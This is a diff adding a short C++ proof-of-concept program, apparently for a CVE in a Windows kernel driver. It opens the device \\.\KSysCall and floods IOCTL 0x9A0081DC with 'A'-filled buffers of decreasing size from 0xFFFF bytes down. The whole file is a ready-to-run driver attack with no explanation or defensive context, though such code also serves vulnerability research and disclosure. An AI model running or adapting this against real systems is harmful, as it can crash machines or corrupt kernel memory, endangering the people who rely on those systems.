@@ -1,0 +1,41 @@
+// CVEPOC.cpp : Defines the entry point for the console application.
+//
+
+#include "stdafx.h"
+#include <Windows.h>
+
+
+
+
+void fuzz_s(HANDLE m_handle, DWORD dwIOCTL)
+{
+	DWORD nbBytes = 0;
+
+	for (int iCount = 0xFFFF; 1 < iCount; iCount-- )
+	{
+		char *pSendBuf = new char[iCount];
+		char *pOutBuf = new char[iCount];
+		memset(pSendBuf, 0x41, iCount);
+
+		DeviceIoControl(m_handle, dwIOCTL, (LPVOID)pSendBuf, iCount, (LPVOID)pOutBuf, iCount, &nbBytes, NULL);
+		delete[] pSendBuf;
+		delete[] pOutBuf;
+	}
+
+	return ;
+}
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+	DWORD nbBytes;
+	HANDLE hDevice;
+
+	hDevice = CreateFile("\\\\.\\KSysCall", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
+	if (hDevice != INVALID_HANDLE_VALUE)
+	{
+		fuzz_s(hDevice, 0x9A0081DC);
+		//DeviceIoControl(hDevice, 0x9A0081DC, (LPVOID)0, 0, (LPVOID)0, 0, &nbBytes, NULL);
+	}
+	return 0;
+}
+
